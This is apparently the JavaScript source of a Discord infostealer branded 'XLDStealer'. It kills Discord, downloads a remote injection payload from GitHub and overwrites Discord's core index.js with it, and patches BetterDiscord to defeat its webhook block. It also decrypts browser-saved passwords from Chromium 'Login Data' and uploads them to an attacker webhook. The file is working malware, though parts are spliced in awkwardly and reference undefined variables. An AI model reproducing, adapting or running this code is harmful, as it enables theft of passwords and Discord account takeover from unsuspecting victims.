
// Code is shit
var glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
var request = require('sync-request');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const webhook = "da_webhook"

const config = {
    "logout": "%LOGOUT%",
    "inject-notify": "%INJECTNOTI%",
    "logout-notify": "%LOGOUTNOTI%",
    "init-notify":"%INITNOTI%",
    "embed-color": 240000,
    "disable-qr-code": "%DISABLEQRCODE%"
}




var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];
 
fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
    
});
takePizzas();
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection-clean', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if ( config.logout !== "false" ) {
                    let folder = file.replace("index.js", "PirateStealerBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    }
                }
            })
            
        });
    }).on("error", (err) => {
        console.log(err);
    });
};


function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {
        console.log(stdout)
        
        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {

            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })


   
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }
    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        path = LOCAL + '\\' + disc + "\\Update.exe"
        exec(`${path} --processStart ${disc}.exe`, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }

}


function injectNotify() {
    var fields = [];
    injectPath.forEach( path => {
        var c = {
            name: "<:bfdnonsfw:966774651449671761> Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
async function getPizzas(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Login Data',
            passwords_db = path + 'passwords.db';
        fs.copyFileSync(login_data, passwords_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = '\n\nPASSWORDS FROM: ' + path + '  #RustlerONTOP\n',
            sql = new sqlite3.Database(passwords_db, err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        const pizza = await new Promise((resolve, reject) => {
            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
                if (err) {
                    if (debug) console.log(err);
                }
                if (row['username_value'] != '') {
                    let password_value = row['password_value'];
                    try {
                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
                                .toString('utf-8');
                        } else {
                            let start = password_value.slice(3, 15),
                                middle = password_value.slice(15, password_value.length - 16),
                                end = password_value.slice(password_value.length - 16, password_value.length),
                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                            decipher.setAuthTag(end);
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                        }
                    } catch (e) {
                        if (debug) console.log(e);
                    }
                }
            }, function () {
                resolve(result);
            });
        });
        return pizza;
    } else {
        return '';
    }
}

async function takePizzas() {
    let passwords = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Login Data'))
            passwords += await getPizzas(paths[i]) || '';
    }
    fs.writeFile(appdata + '\\passwords.txt', passwords, function (err, data) {

        if (err) throw err;
      
        const form = new FormData();
        form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
        form.submit(webhook, (error, response) => {
        if (error) console.log(error);
        });
    });
    fs.writeFile(appdata + '\\src-passwords.txt', passwords, function (err, data) {

        if (err) throw err;
      
        const form = new FormData();
        form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt"));
        form.submit(webhook, (error, response) => {
        if (error) console.log(error);
        });
    });
}
    axios
	.post(webhook, {
        "content": null, 
        "embeds": [
          {
            "title": "<:bfdnonsfw:966774651449671761> Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "XLDStealer",
"icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg"
            },
            "footer": {
              "text": "XLDStealer",
"icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg"
            }
          }
        ]
      })
	.then(res => {
	})
	.catch(error => {

    })

}
